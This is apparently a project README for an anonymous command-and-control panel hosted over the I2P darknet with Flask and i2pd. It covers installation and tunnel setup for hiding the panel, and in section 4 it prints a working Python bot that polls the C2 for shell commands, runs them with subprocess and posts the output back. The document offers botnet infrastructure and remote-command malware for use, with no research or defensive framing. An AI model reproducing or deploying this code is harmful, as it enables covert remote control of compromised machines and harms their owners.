# 🕵️‍♂️ I2P Command & Control Panel

A fancy, lightweight, and anonymous Command & Control (C2) panel built using Flask, Bootstrap 5, and SQLite — accessible via the I2P darknet using `i2pd`.

---

## ✅ Features

- ✨ Fancy Bootstrap 5 UI
- 🧠 SQLite-based bot command/output tracking
- 🔐 Full C2 communication over I2P `.b32.i2p` addresses
- 🕸️ Remote command dispatch and bot response capture

---

## ✅ 1. Installation

### Requirements

- Python 3.8+
- Flask
- SQLite3
- `i2pd` (I2P router daemon)

### Install Flask

```
pip install flask
````

---

## ✅ 2. Running the Panel

Clone and run:

```
git clone https://github.com/yourname/i2p-c2-panel.git
cd i2p-c2-panel
python3 app.py
```

The panel will run on `http://127.0.0.1:8080`

---

## ✅ 3. I2P Tunnel Setup

### Option A: Using `i2pd` (Fastest and Headless)

#### Install i2pd (Debian/Ubuntu):

```
sudo apt install i2pd
```

#### Edit `~/.i2pd/tunnels.conf`:

```ini
[c2_panel]
type = http
address = 127.0.0.1
port = 8080
inport = 80
keys = c2.dat
```

#### Start i2pd:

```
sudo systemctl start i2pd
```

#### Check the I2P hostname:

```
cat ~/.i2pd/c2.dat.b32.i2p
```

Your panel will now be available at:

```
http://[c2name].b32.i2p
```

---

## ✅ 4. Bot Communication Example

Here’s an example Python bot that polls the C2 for commands and submits output.

```python
import time, requests, subprocess

C2 = "http://[your-c2-name].b32.i2p"
NAME = "test-bot"

while True:
    try:
        cmd = requests.get(f"{C2}/get_command").text
        if cmd:
            out = subprocess.getoutput(cmd)
            requests.post(f"{C2}/submit_output", data={"name": NAME, "output": out})
        time.sleep(30)
    except:
        time.sleep(60)
```

**Note:** Configure your I2P proxy or local tunnels so that bots can resolve `.b32.i2p` addresses.

---

## ✅ 5. Directory Structure

```
i2p-c2-panel/
├── app.py
├── c2.db  (auto-created)
└── templates/
    └── index.html
```

---

## ✅ 6. Summary

| Component   | Purpose                         |
| ----------- | ------------------------------- |
| Flask       | Backend server and web UI       |
| Bootstrap 5 | Fancy UI for control panel      |
| SQLite      | Stores bot output + commands    |
| I2P / i2pd  | Makes it accessible anonymously |

---
